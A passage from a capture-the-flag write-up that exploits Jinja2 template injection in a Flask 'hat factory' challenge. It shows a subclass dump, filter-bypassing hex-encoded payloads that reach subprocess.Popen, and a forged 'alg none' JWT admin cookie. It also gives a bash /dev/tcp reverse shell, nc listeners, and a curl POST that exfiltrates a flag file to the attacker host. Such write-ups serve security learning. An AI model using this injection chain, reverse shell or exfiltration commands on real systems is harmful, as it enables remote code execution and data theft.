<class 'zipfile.LZMACompressor'>, 
<class 'zipfile.LZMADecompressor'>, 
<class 'zipfile._SharedFile'>, 
<class 'zipfile._Tellable'>, 
<class 'zipfile.ZipFile'>, 
<class 'weakref.finalize._Info'>, 
<class 'weakref.finalize'>, 
<class 'pkgutil.ImpImporter'>, 
<class 'pkgutil.ImpLoader'>, 
<class 'select.poll'>, 
<class 'select.epoll'>, 
<class 'selectors.BaseSelector'>, 
<class 'subprocess.CompletedProcess'>, 
<class 'subprocess.Popen'>, 
<class 'datetime.date'>, 
<class 'datetime.timedelta'>, 
<class 'datetime.time'>, 
<class 'datetime.tzinfo'>, 
<class 'pyexpat.xmlparser'>, 
<class 'plistlib.Data'>, 
<class 'plistlib._PlistParser'>, 
<class 'plistlib._DumbXMLWriter'>, 
<class 'plistlib._BinaryPlistParser'>, 
<class 'plistlib._BinaryPlistWriter'>, 
<class 'string.Template'>, 
<class 'string.Formatter'>, 
<class 'email.charset.Charset'>, 
<class 'email.header.Header'>, 
<class 'email.header._ValueFormatter'>, 
<class '_hashlib.HASH'>, 
<class '_blake2.blake2b'>, 
<class '_blake2.blake2s'>, 
<class '_sha3.sha3_224'>, 
<class '_sha3.sha3_256'>, 
<class '_sha3.sha3_384'>, 
<class '_sha3.sha3_512'>, 
<class '_sha3.shake_128'>, 
<class '_sha3.shake_256'>, 
<class '_random.Random'>, 
<class '_socket.socket'>, 
<class 'urllib.parse._ResultMixinStr'>, 
<class 'urllib.parse._ResultMixinBytes'>, 
<class 'urllib.parse._NetlocResultMixinBase'>, 
<class 'calendar._localized_month'>, 
<class 'calendar._localized_day'>, 
<class 'calendar.Calendar'>, 
<class 'calendar.different_locale'>, 
<class 'email._parseaddr.AddrlistClass'>, 
<class 'email._policybase._PolicyBase'>, 
<class 'email.feedparser.BufferedSubFile'>, 
<class 'email.feedparser.FeedParser'>, 
<class 'email.parser.Parser'>, 
<class 'email.parser.BytesParser'>, 
<class 'tempfile._RandomNameSequence'>, 
<class 'tempfile._TemporaryFileCloser'>, 
<class 'tempfile._TemporaryFileWrapper'>, 
<class 'tempfile.SpooledTemporaryFile'>, 
<class 'tempfile.TemporaryDirectory'>, 
<class 'textwrap.TextWrapper'>, 
<class 'dis.Bytecode'>, 
<class 'inspect.BlockFinder'>, 
<class 'inspect._void'>, 
<class 'inspect._empty'>, 
<class 'inspect.Parameter'>, 
<class 'inspect.BoundArguments'>, 
<class 'inspect.Signature'>, 
<class 'pkg_resources.extern.VendorImporter'>, 
<class 'pkg_resources._vendor.six._LazyDescr'>, 
<class 'pkg_resources._vendor.six._SixMetaPathImporter'>, 
<class 'pkg_resources._vendor.six._LazyDescr'>, 
<class 'pkg_resources._vendor.six._SixMetaPathImporter'>, 
<class 'pkg_resources._vendor.appdirs.AppDirs'>, 
<class 'pkg_resources.extern.packaging._structures.Infinity'>, 
<class 'pkg_resources.extern.packaging._structures.NegativeInfinity'>, 
<class 'pkg_resources.extern.packaging.version._BaseVersion'>, 
<class 'pkg_resources.extern.packaging.specifiers.BaseSpecifier'>, 
<class 'pprint._safe_key'>, 
<class 'pprint.PrettyPrinter'>, 
<class 'pkg_resources._vendor.pyparsing._Constants'>, 
<class 'pkg_resources._vendor.pyparsing._ParseResultsWithOffset'>, 
<class 'pkg_resources._vendor.pyparsing.ParseResults'>, 
<class 'pkg_resources._vendor.pyparsing.ParserElement._UnboundedCache'>, 
<class 'pkg_resources._vendor.pyparsing.ParserElement._FifoCache'>, 
<class 'pkg_resources._vendor.pyparsing.ParserElement'>, 
<class 'pkg_resources._vendor.pyparsing._NullToken'>, 
<class 'pkg_resources._vendor.pyparsing.OnlyOnce'>, 
<class 'pkg_resources._vendor.pyparsing.pyparsing_common'>, 
<class 'pkg_resources.extern.packaging.markers.Node'>, 
<class 'pkg_resources.extern.packaging.markers.Marker'>, 
<class 'pkg_resources.extern.packaging.requirements.Requirement'>, 
<class 'pkg_resources.IMetadataProvider'>, 
<class 'pkg_resources.WorkingSet'>, 
<class 'pkg_resources.Environment'>, 
<class 'pkg_resources.ResourceManager'>, 
<class 'pkg_resources.NullProvider'>, 
<class 'pkg_resources.NoDists'>, 
<class 'pkg_resources.EntryPoint'>, 
<class 'pkg_resources.Distribution'>, 
<class 'gunicorn.six._LazyDescr'>, 
<class 'gunicorn.six._SixMetaPathImporter'>, 
<class 'logging.LogRecord'>, 
<class 'logging.PercentStyle'>, 
<class 'logging.Formatter'>, 
<class 'logging.BufferingFormatter'>, 
<class 'logging.Filter'>, 
<class 'logging.Filterer'>, 
<class 'logging.PlaceHolder'>, 
<class 'logging.Manager'>, 
<class 'logging.LoggerAdapter'>, 
<class 'gunicorn.pidfile.Pidfile'>, 
<class 'gunicorn.sock.BaseSocket'>, 
<class 'gunicorn.arbiter.Arbiter'>, 
<class 'gettext.NullTranslations'>, 
<class 'argparse._AttributeHolder'>, 
<class 'argparse.HelpFormatter._Section'>, 
<class 'argparse.HelpFormatter'>, 
<class 'argparse.FileType'>, 
<class 'argparse._ActionsContainer'>, 
<class '_ssl._SSLContext'>, 
<class '_ssl._SSLSocket'>, 
<class '_ssl.MemoryBIO'>, 
<class '_ssl.Session'>, 
<class 'ssl.SSLObject'>, 
<class 'shlex.shlex'>, 
<class 'gunicorn.reloader.InotifyReloader'>, 
<class 'gunicorn.config.Config'>, 
<class 'gunicorn.config.Setting'>, 
<class 'gunicorn.debug.Spew'>, 
<class 'gunicorn.app.base.BaseApplication'>, 
<class 'pickle._Framer'>, 
<class 'pickle._Unframer'>, 
<class 'pickle._Pickler'>, 
<class 'pickle._Unpickler'>, 
<class '_pickle.Unpickler'>, 
<class '_pickle.Pickler'>, 
<class '_pickle.Pdata'>, 
<class '_pickle.PicklerMemoProxy'>, 
<class '_pickle.UnpicklerMemoProxy'>, 
<class '_queue.SimpleQueue'>, 
<class 'queue.Queue'>, 
<class 'queue._PySimpleQueue'>, 
<class 'logging.handlers.QueueListener'>, 
<class 'socketserver.BaseServer'>, 
<class 'socketserver.ForkingMixIn'>, 
<class 'socketserver.ThreadingMixIn'>, 
<class 'socketserver.BaseRequestHandler'>, 
<class 'logging.config.ConvertingMixin'>, 
<class 'logging.config.BaseConfigurator'>, 
<class 'gunicorn.glogging.Logger'>, 
<class 'gunicorn.http.unreader.Unreader'>, 
<class 'gunicorn.http.body.ChunkedReader'>, 
<class 'gunicorn.http.body.LengthReader'>, 
<class 'gunicorn.http.body.EOFReader'>, 
<class 'gunicorn.http.body.Body'>, 
<class 'gunicorn.http.message.Message'>, 
<class 'gunicorn.http.parser.Parser'>, 
<class 'gunicorn.http.wsgi.FileWrapper'>, 
<class 'gunicorn.http.wsgi.Response'>, 
<class 'gunicorn.workers.workertmp.WorkerTmp'>, 
<class 'gunicorn.workers.base.Worker'>, 
<class 'concurrent.futures._base._Waiter'>, 
<class 'concurrent.futures._base._AcquireFutures'>, 
<class 'concurrent.futures._base.Future'>, 
<class 'concurrent.futures._base.Executor'>, 
<class 'asyncio.coroutines.CoroWrapper'>, 
<class 'asyncio.events.Handle'>, 
<class 'asyncio.events.AbstractServer'>, 
<class 'asyncio.events.AbstractEventLoop'>, 
<class 'asyncio.events.AbstractEventLoopPolicy'>, 
<class '_asyncio.Future'>, 
<class '_asyncio.FutureIter'>, 
<class 'TaskStepMethWrapper'>, 
<class 'TaskWakeupMethWrapper'>, 
<class '_RunningLoopHolder'>, 
<class 'asyncio.futures.Future'>, 
<class 'asyncio.protocols.BaseProtocol'>, 
<class 'asyncio.transports.BaseTransport'>, 
<class 'asyncio.sslproto._SSLPipe'>, 
<class 'asyncio.locks._ContextManager'>, 
<class 'asyncio.locks._ContextManagerMixin'>, 
<class 'asyncio.locks.Event'>, 
<class 'asyncio.queues.Queue'>, 
<class 'asyncio.streams.StreamWriter'>, 
<class 'asyncio.streams.StreamReader'>, 
<class 'asyncio.subprocess.Process'>, 
<class 'asyncio.unix_events.AbstractChildWatcher'>, 
<class 'gunicorn.selectors.BaseSelector'>, 
<class 'gunicorn.workers.gthread.TConn'>, 
<class 'concurrent.futures.thread._WorkItem'>, 
<class '_ast.AST'>, 
<class '_json.Scanner'>, 
<class '_json.Encoder'>, 
<class 'json.decoder.JSONDecoder'>, 
<class 'json.encoder.JSONEncoder'>, 
<class 'jinja2.utils.MissingType'>, 
<class 'jinja2.utils.LRUCache'>, 
<class 'jinja2.utils.Cycler'>, 
<class 'jinja2.utils.Joiner'>, 
<class 'jinja2.utils.Namespace'>, 
<class 'markupsafe._MarkupEscapeHelper'>, 
<class 'jinja2.nodes.EvalContext'>, 
<class 'jinja2.nodes.Node'>, 
<class 'jinja2.runtime.TemplateReference'>, 
<class 'jinja2.runtime.Context'>, 
<class 'jinja2.runtime.BlockReference'>, 
<class 'jinja2.runtime.LoopContextBase'>, 
<class 'jinja2.runtime.LoopContextIterator'>, 
<class 'jinja2.runtime.Macro'>, 
<class 'jinja2.runtime.Undefined'>, 
<class 'decimal.Decimal'>, 
<class 'decimal.Context'>, 
<class 'decimal.SignalDictMixin'>, 
<class 'decimal.ContextManager'>, 
<class 'numbers.Number'>, 
<class 'jinja2.lexer.Failure'>, 
<class 'jinja2.lexer.TokenStreamIterator'>, 
<class 'jinja2.lexer.TokenStream'>, 
<class 'jinja2.lexer.Lexer'>, 
<class 'jinja2.parser.Parser'>, 
<class 'jinja2.visitor.NodeVisitor'>, 
<class 'jinja2.idtracking.Symbols'>, 
<class 'jinja2.compiler.MacroRef'>, 
<class 'jinja2.compiler.Frame'>, 
<class 'jinja2.environment.Environment'>, 
<class 'jinja2.environment.Template'>, 
<class 'jinja2.environment.TemplateModule'>, 
<class 'jinja2.environment.TemplateExpression'>, 
<class 'jinja2.environment.TemplateStream'>, 
<class 'jinja2.loaders.BaseLoader'>, 
<class 'jinja2.bccache.Bucket'>, 
<class 'jinja2.bccache.BytecodeCache'>, 
<class 'jinja2.asyncsupport.AsyncLoopContextIterator'>, 
<class 'werkzeug._internal._Missing'>, 
<class 'werkzeug._internal._DictAccessorProperty'>, 
<class 'werkzeug.utils.HTMLBuilder'>, 
<class 'werkzeug.exceptions.Aborter'>, 
<class 'werkzeug.urls.Href'>, 
<class 'email.message.Message'>, 
<class 'http.client.HTTPConnection'>, 
<class 'mimetypes.MimeTypes'>, 
<class 'werkzeug.serving.WSGIRequestHandler'>, 
<class 'werkzeug.serving._SSLContext'>, 
<class 'werkzeug.serving.BaseWSGIServer'>, 
<class 'werkzeug.datastructures.ImmutableListMixin'>, 
<class 'werkzeug.datastructures.ImmutableDictMixin'>, 
<class 'werkzeug.datastructures.UpdateDictMixin'>, 
<class 'werkzeug.datastructures.ViewItems'>, 
<class 'werkzeug.datastructures._omd_bucket'>, 
<class 'werkzeug.datastructures.Headers'>, 
<class 'werkzeug.datastructures.ImmutableHeadersMixin'>, 
<class 'werkzeug.datastructures.IfRange'>, 
<class 'werkzeug.datastructures.Range'>, 
<class 'werkzeug.datastructures.ContentRange'>, 
<class 'werkzeug.datastructures.FileStorage'>, 
<class 'urllib.request.Request'>, 
<class 'urllib.request.OpenerDirector'>, 
<class 'urllib.request.BaseHandler'>, 
<class 'urllib.request.HTTPPasswordMgr'>, 
<class 'urllib.request.AbstractBasicAuthHandler'>, 
<class 'urllib.request.AbstractDigestAuthHandler'>, 
<class 'urllib.request.URLopener'>, 
<class 'urllib.request.ftpwrapper'>, 
<class 'werkzeug.wrappers.accept.AcceptMixin'>, 
<class 'werkzeug.wrappers.auth.AuthorizationMixin'>, 
<class 'werkzeug.wrappers.auth.WWWAuthenticateMixin'>, 
<class 'werkzeug.wsgi.ClosingIterator'>, 
<class 'werkzeug.wsgi.FileWrapper'>, 
<class 'werkzeug.wsgi._RangeWrapper'>, 
<class 'werkzeug.formparser.FormDataParser'>, 
<class 'werkzeug.formparser.MultiPartParser'>, 
<class 'werkzeug.wrappers.base_request.BaseRequest'>, 
<class 'werkzeug.wrappers.base_response.BaseResponse'>, 
<class 'werkzeug.wrappers.common_descriptors.CommonRequestDescriptorsMixin'>, 
<class 'werkzeug.wrappers.common_descriptors.CommonResponseDescriptorsMixin'>, 
<class 'werkzeug.wrappers.etag.ETagRequestMixin'>, 
<class 'werkzeug.wrappers.etag.ETagResponseMixin'>, 
<class 'werkzeug.useragents.UserAgentParser'>, 
<class 'werkzeug.useragents.UserAgent'>, 
<class 'werkzeug.wrappers.user_agent.UserAgentMixin'>, 
<class 'werkzeug.wrappers.request.StreamOnlyMixin'>, 
<class 'werkzeug.wrappers.response.ResponseStream'>, 
<class 'werkzeug.wrappers.response.ResponseStreamMixin'>, 
<class 'http.cookiejar.Cookie'>, 
<class 'http.cookiejar.CookiePolicy'>, 
<class 'http.cookiejar.Absent'>, 
<class 'http.cookiejar.CookieJar'>, 
<class 'werkzeug.test._TestCookieHeaders'>, 
<class 'werkzeug.test._TestCookieResponse'>, 
<class 'werkzeug.test.EnvironBuilder'>, 
<class 'werkzeug.test.Client'>, 
<class 'uuid.UUID'>, 
<class 'itsdangerous._json._CompactJSON'>, 
<class 'hmac.HMAC'>, 
<class 'itsdangerous.signer.SigningAlgorithm'>, 
<class 'itsdangerous.signer.Signer'>, 
<class 'itsdangerous.serializer.Serializer'>, 
<class 'itsdangerous.url_safe.URLSafeSerializerMixin'>, 
<class 'flask._compat._DeprecatedBool'>, 
<class 'greenlet.greenlet'>, 
<class 'werkzeug.local.Local'>, 
<class 'werkzeug.local.LocalStack'>, 
<class 'werkzeug.local.LocalManager'>, 
<class 'werkzeug.local.LocalProxy'>, 
<class 'dataclasses._HAS_DEFAULT_FACTORY_CLASS'>, 
<class 'dataclasses._MISSING_TYPE'>, 
<class 'dataclasses._FIELD_BASE'>, 
<class 'dataclasses.InitVar'>, 
<class 'dataclasses.Field'>, 
<class 'dataclasses._DataclassParams'>, 
<class 'ast.NodeVisitor'>, 
<class 'difflib.SequenceMatcher'>, 
<class 'difflib.Differ'>, 
<class 'difflib.HtmlDiff'>, 
<class 'werkzeug.routing.RuleFactory'>, 
<class 'werkzeug.routing.RuleTemplate'>, 
<class 'werkzeug.routing.BaseConverter'>, 
<class 'werkzeug.routing.Map'>, 
<class 'werkzeug.routing.MapAdapter'>, 
<class 'click._compat._FixupStream'>, 
<class 'click._compat._AtomicFile'>, 
<class 'click.utils.LazyFile'>, 
<class 'click.utils.KeepOpenFile'>, 
<class 'click.utils.PacifyFlushWrapper'>, 
<class 'click.types.ParamType'>, 
<class 'click.parser.Option'>, 
<class 'click.parser.Argument'>, 
<class 'click.parser.ParsingState'>, 
<class 'click.parser.OptionParser'>, 
<class 'click.formatting.HelpFormatter'>, 
<class 'click.core.Context'>, 
<class 'click.core.BaseCommand'>, 
<class 'click.core.Parameter'>, 
<class 'flask.signals.Namespace'>, 
<class 'flask.signals._FakeSignal'>, 
<class 'flask.helpers.locked_cached_property'>, 
<class 'flask.helpers._PackageBoundObject'>, 
<class 'flask.cli.DispatchingApp'>, 
<class 'flask.cli.ScriptInfo'>, 
<class 'flask.config.ConfigAttribute'>, 
<class 'flask.ctx._AppCtxGlobals'>, 
<class 'flask.ctx.AppContext'>, 
<class 'flask.ctx.RequestContext'>, 
<class 'flask.json.tag.JSONTag'>, 
<class 'flask.json.tag.TaggedJSONSerializer'>, 
<class 'flask.sessions.SessionInterface'>, 
<class 'werkzeug.wrappers.json._JSONModule'>, 
<class 'werkzeug.wrappers.json.JSONMixin'>, 
<class 'flask.blueprints.BlueprintSetupState'>, 
<class 'typing._Final'>, 
<class 'typing._Immutable'>, 
<class 'typing.Generic'>, 
<class 'typing._TypingEmpty'>, 
<class 'typing._TypingEllipsis'>, 
<class 'typing.NamedTuple'>, 
<class 'typing.io'>, 
<class 'typing.re'>, 
<class 'six._LazyDescr'>, 
<class 'six._SixMetaPathImporter'>, 
<class 'cryptography.hazmat.primitives.asymmetric.AsymmetricSignatureContext'>, 
<class 'cryptography.hazmat.primitives.asymmetric.AsymmetricVerificationContext'>, 
<class 'unicodedata.UCD'>, 
<class 'asn1crypto.util.extended_date'>, 
<class 'asn1crypto.util.extended_datetime'>, 
<class 'CArgObject'>, 
<class '_ctypes.CThunkObject'>, 
<class '_ctypes._CData'>, 
<class '_ctypes.CField'>, 
<class '_ctypes.DictRemover'>, 
<class 'ctypes.CDLL'>, 
<class 'ctypes.LibraryLoader'>, 
<class 'asn1crypto.core.Asn1Value'>, 
<class 'asn1crypto.core.ValueMap'>, 
<class 'asn1crypto.core.Castable'>, 
<class 'asn1crypto.core.Constructable'>, 
<class 'asn1crypto.core.Concat'>, 
<class 'asn1crypto.core.BitString'>, 
<class 'asn1crypto.algos._ForceNullParameters'>, 
<class 'cryptography.utils._DeprecatedValue'>, 
<class 'cryptography.utils._ModuleWithDeprecations'>, 
<class 'cryptography.hazmat.backends.interfaces.CipherBackend'>, 
<class 'cryptography.hazmat.backends.interfaces.HashBackend'>, 
<class 'cryptography.hazmat.backends.interfaces.HMACBackend'>, 
<class 'cryptography.hazmat.backends.interfaces.CMACBackend'>, 
<class 'cryptography.hazmat.backends.interfaces.PBKDF2HMACBackend'>, 
<class 'cryptography.hazmat.backends.interfaces.RSABackend'>, 
<class 'cryptography.hazmat.backends.interfaces.DSABackend'>, 
<class 'cryptography.hazmat.backends.interfaces.EllipticCurveBackend'>, 
<class 'cryptography.hazmat.backends.interfaces.PEMSerializationBackend'>, 
<class 'cryptography.hazmat.backends.interfaces.DERSerializationBackend'>, 
<class 'cryptography.hazmat.backends.interfaces.X509Backend'>, 
<class 'cryptography.hazmat.backends.interfaces.DHBackend'>, 
<class 'cryptography.hazmat.backends.interfaces.ScryptBackend'>, 
<class 'cryptography.hazmat.primitives.hashes.HashAlgorithm'>, 
<class 'cryptography.hazmat.primitives.hashes.HashContext'>, 
<class 'cryptography.hazmat.primitives.hashes.ExtendableOutputFunction'>, 
<class 'cryptography.hazmat.primitives.hashes.Hash'>, 
<class 'cryptography.hazmat.primitives.hashes.SHA1'>, 
<class 'cryptography.hazmat.primitives.hashes.SHA512_224'>, 
<class 'cryptography.hazmat.primitives.hashes.SHA512_256'>, 
<class 'cryptography.hazmat.primitives.hashes.SHA224'>, 
<class 'cryptography.hazmat.primitives.hashes.SHA256'>, 
<class 'cryptography.hazmat.primitives.hashes.SHA384'>, 
<class 'cryptography.hazmat.primitives.hashes.SHA512'>, 
<class 'cryptography.hazmat.primitives.hashes.SHA3_224'>, 
<class 'cryptography.hazmat.primitives.hashes.SHA3_256'>, 
<class 'cryptography.hazmat.primitives.hashes.SHA3_384'>, 
<class 'cryptography.hazmat.primitives.hashes.SHA3_512'>, 
<class 'cryptography.hazmat.primitives.hashes.SHAKE128'>, 
<class 'cryptography.hazmat.primitives.hashes.SHAKE256'>, 
<class 'cryptography.hazmat.primitives.hashes.MD5'>, 
<class 'cryptography.hazmat.primitives.hashes.BLAKE2b'>, 
<class 'cryptography.hazmat.primitives.hashes.BLAKE2s'>, 
<class 'cryptography.hazmat.primitives.asymmetric.utils.Prehashed'>, 
<class 'cryptography.hazmat.primitives.serialization.base.KeySerializationEncryption'>, 
<class 'cryptography.hazmat.primitives.serialization.base.BestAvailableEncryption'>, 
<class 'cryptography.hazmat.primitives.serialization.base.NoEncryption'>, 
<class 'cryptography.hazmat.primitives.asymmetric.dsa.DSAParameters'>, 
<class 'cryptography.hazmat.primitives.asymmetric.dsa.DSAPrivateKey'>, 
<class 'cryptography.hazmat.primitives.asymmetric.dsa.DSAPublicKey'>, 
<class 'cryptography.hazmat.primitives.asymmetric.dsa.DSAParameterNumbers'>, 
<class 'cryptography.hazmat.primitives.asymmetric.dsa.DSAPublicNumbers'>, 
<class 'cryptography.hazmat.primitives.asymmetric.dsa.DSAPrivateNumbers'>, 
<class 'cryptography.hazmat._oid.ObjectIdentifier'>, 
<class 'cryptography.hazmat.primitives.asymmetric.ec.EllipticCurveOID'>, 
<class 'cryptography.hazmat.primitives.asymmetric.ec.EllipticCurve'>, 
<class 'cryptography.hazmat.primitives.asymmetric.ec.EllipticCurveSignatureAlgorithm'>, 
<class 'cryptography.hazmat.primitives.asymmetric.ec.EllipticCurvePrivateKey'>, 
<class 'cryptography.hazmat.primitives.asymmetric.ec.EllipticCurvePublicKey'>, 
<class 'cryptography.hazmat.primitives.asymmetric.ec.SECT571R1'>, 
<class 'cryptography.hazmat.primitives.asymmetric.ec.SECT409R1'>, 
<class 'cryptography.hazmat.primitives.asymmetric.ec.SECT283R1'>, 
<class 'cryptography.hazmat.primitives.asymmetric.ec.SECT233R1'>, 
<class 'cryptography.hazmat.primitives.asymmetric.ec.SECT163R2'>, 
<class 'cryptography.hazmat.primitives.asymmetric.ec.SECT571K1'>, 
<class 'cryptography.hazmat.primitives.asymmetric.ec.SECT409K1'>, 
<class 'cryptography.hazmat.primitives.asymmetric.ec.SECT283K1'>, 
<class 'cryptography.hazmat.primitives.asymmetric.ec.SECT233K1'>, 
<class 'cryptography.hazmat.primitives.asymmetric.ec.SECT163K1'>, 
<class 'cryptography.hazmat.primitives.asymmetric.ec.SECP521R1'>, 
<class 'cryptography.hazmat.primitives.asymmetric.ec.SECP384R1'>, 
<class 'cryptography.hazmat.primitives.asymmetric.ec.SECP256R1'>, 
<class 'cryptography.hazmat.primitives.asymmetric.ec.SECP256K1'>, 
<class 'cryptography.hazmat.primitives.asymmetric.ec.SECP224R1'>, 
<class 'cryptography.hazmat.primitives.asymmetric.ec.SECP192R1'>, 
<class 'cryptography.hazmat.primitives.asymmetric.ec.BrainpoolP256R1'>, 
<class 'cryptography.hazmat.primitives.asymmetric.ec.BrainpoolP384R1'>, 
<class 'cryptography.hazmat.primitives.asymmetric.ec.BrainpoolP512R1'>, 
<class 'cryptography.hazmat.primitives.asymmetric.ec.ECDSA'>, 
<class 'cryptography.hazmat.primitives.asymmetric.ec.EllipticCurvePublicNumbers'>, 
<class 'cryptography.hazmat.primitives.asymmetric.ec.EllipticCurvePrivateNumbers'>, 
<class 'cryptography.hazmat.primitives.asymmetric.ec.ECDH'>, 
<class 'cryptography.hazmat.primitives.asymmetric.ed25519.Ed25519PublicKey'>, 
<class 'cryptography.hazmat.primitives.asymmetric.ed25519.Ed25519PrivateKey'>, 
<class 'cryptography.hazmat.primitives.asymmetric.rsa.RSAPrivateKey'>, 
<class 'cryptography.hazmat.primitives.asymmetric.rsa.RSAPrivateKey'>, 
<class 'cryptography.hazmat.primitives.asymmetric.rsa.RSAPublicKey'>, 
<class 'cryptography.hazmat.primitives.asymmetric.rsa.RSAPrivateNumbers'>, 
<class 'cryptography.hazmat.primitives.asymmetric.rsa.RSAPublicNumbers'>, 
<class 'cryptography.hazmat.primitives.asymmetric.padding.AsymmetricPadding'>, 
<class 'cryptography.hazmat.primitives.asymmetric.padding.PKCS1v15'>, 
<class 'cryptography.hazmat.primitives.asymmetric.padding.PSS'>, 
<class 'cryptography.hazmat.primitives.asymmetric.padding.OAEP'>, 
<class 'cryptography.hazmat.primitives.asymmetric.padding.MGF1'>, 
<class 'jwt.algorithms.Algorithm'>, 
<class 'jwt.api_jws.PyJWS'>, 
<class 'jinja2.ext.Extension'>, 
<class 'jinja2.ext._CommentFinder'>, 
<class 'jinja2.debug.TracebackFrameProxy'>, 
<class 'jinja2.debug.ProcessedTraceback'>]
```

You can use the `__dir__()` method to enumerate all the methods that can be called from this result.

```
GET /makehat?hatName={{''|attr('\x5f\x5fclass\x5f\x5f')|attr('\x5f\x5fmro\x5f\x5f')|last|attr('\x5f\x5fsubclasses\x5f\x5f')()|attr('\x5f\x5fdir\x5f\x5f')()}} HTTP/1.1
Host: challs.xmas.htsp.ro:11005
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:71.0) Gecko/20100101 Firefox/71.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: it-IT,it;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate
Referer: http://challs.xmas.htsp.ro:11005/register
Connection: close
Cookie: auth=eyJ0eXAiOiJKV1QiLCJhbGciOiJub25lIn0.eyJ0eXBlIjoiYWRtaW4iLCJ1c2VyIjoiU2FudGEiLCJwYXNzIjoiTWtvMDlpam4ifQ.
Upgrade-Insecure-Requests: 1
Cache-Control: max-age=0

HTTP/1.1 200 OK
Server: nginx
Date: Thu, 19 Dec 2019 10:00:30 GMT
Content-Type: text/html; charset=utf-8
Content-Length: 1385
Connection: close

<head>
	<link rel="stylesheet" type="text/css" href="/static/css/styles.css">
</head>

<body>
	<div class="navbar">
<a style="float: left" href="/">Home</a>

	<a href="/login">Login</a>
	<a href="/register">Register</a>

</div>
	<div class="container" style="text-align:center">
		<img class="hat" src="/static/img/hats/7.png">
		<h1>You are viewing:<br><span style="color:#FFA144;">[&#39;__repr__&#39;, &#39;__hash__&#39;, &#39;__getattribute__&#39;, &#39;__lt__&#39;, &#39;__le__&#39;, &#39;__eq__&#39;, &#39;__ne__&#39;, &#39;__gt__&#39;, &#39;__ge__&#39;, &#39;__iter__&#39;, &#39;__init__&#39;, &#39;__len__&#39;, &#39;__getitem__&#39;, &#39;__setitem__&#39;, &#39;__delitem__&#39;, &#39;__add__&#39;, &#39;__mul__&#39;, &#39;__rmul__&#39;, &#39;__contains__&#39;, &#39;__iadd__&#39;, &#39;__imul__&#39;, &#39;__new__&#39;, &#39;__reversed__&#39;, &#39;__sizeof__&#39;, &#39;clear&#39;, &#39;copy&#39;, &#39;append&#39;, &#39;insert&#39;, &#39;extend&#39;, &#39;pop&#39;, &#39;remove&#39;, &#39;index&#39;, &#39;count&#39;, &#39;reverse&#39;, &#39;sort&#39;, &#39;__doc__&#39;, &#39;__str__&#39;, &#39;__setattr__&#39;, &#39;__delattr__&#39;, &#39;__reduce_ex__&#39;, &#39;__reduce__&#39;, &#39;__subclasshook__&#39;, &#39;__init_subclass__&#39;, &#39;__format__&#39;, &#39;__dir__&#39;, &#39;__class__&#39;]</span></h1>
	</div>
</body>

<script src="/static/js/snow.js"></script>
```

There is an interesting `__getitem__()` method that can be used to retrieve the data from the list using the index but without using `[]`.

The `<class 'subprocess.Popen'>` class is at position number `215` and allow us to launch commands.

We can setup a server listening on port `1337` with `nc -lk 1337` and then encode a reverse shell that will be launched on the victim host in order to connect to our server.

```
/bin/bash -c "/bin/bash -i >& /dev/tcp/x.x.x.x/1337 0>&1"

\x2f\x62\x69\x6e\x2f\x62\x61\x73\x68\x20\x2d\x63\x20\x22\x2f\x62\x69\x6e\x2f\x62\x61\x73\x68\x20\x2d\x69\x20\x3e\x26\x20\x2f\x64\x65\x76\x2f\x74\x63\x70\x2f\x78\x2e\x78\x2e\x78\x2e\x78\x2f\x31\x33\x33\x37\x20\x30\x3e\x26\x31\x22
```

The request will be the following.

```
GET /makehat?hatName={{''|attr('\x5f\x5fclass\x5f\x5f')|attr('\x5f\x5fmro\x5f\x5f')|last|attr('\x5f\x5fsubclasses\x5f\x5f')()|attr('\x5f\x5fgetitem\x5f\x5f')(215)('\x2f\x62\x69\x6e\x2f\x62\x61\x73\x68\x20\x2d\x63\x20\x22\x2f\x62\x69\x6e\x2f\x62\x61\x73\x68\x20\x2d\x69\x20\x3e\x26\x20\x2f\x64\x65\x76\x2f\x74\x63\x70\x2f\x78\x2e\x78\x2e\x78\x2e\x78\x2f\x31\x33\x33\x37\x20\x30\x3e\x26\x31\x22',shell=True)}} HTTP/1.1
Host: challs.xmas.htsp.ro:11005
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:71.0) Gecko/20100101 Firefox/71.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: it-IT,it;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate
Referer: http://challs.xmas.htsp.ro:11005/register
Connection: close
Cookie: auth=eyJ0eXAiOiJKV1QiLCJhbGciOiJub25lIn0.eyJ0eXBlIjoiYWRtaW4iLCJ1c2VyIjoiU2FudGEiLCJwYXNzIjoiTWtvMDlpam4ifQ.
Upgrade-Insecure-Requests: 1
Cache-Control: max-age=0
```

On the victim host an interesting file can be found: `unusual_flag.mp4`. It can be transferred like the following:
* on the attacker machine: `nc -l -p 8000 > unusual_flag.mp4`;
* on the victim machine: `curl -X POST --data-binary @unusual_flag.mp4 http://x.x.x.x:8000`.

At this point you have to remove the HTTP headers inserted into the created file by `nc` and then you can launch the MP4 video [unusual_flag.mp4](unusual_flag.mp4).

Into the video there is the flag.

```
X-MAS{W3lc0m3_70_7h3_h4t_f4ct0ry__w3ve_g0t_unusu4l_h4ts_90d81c091da}
```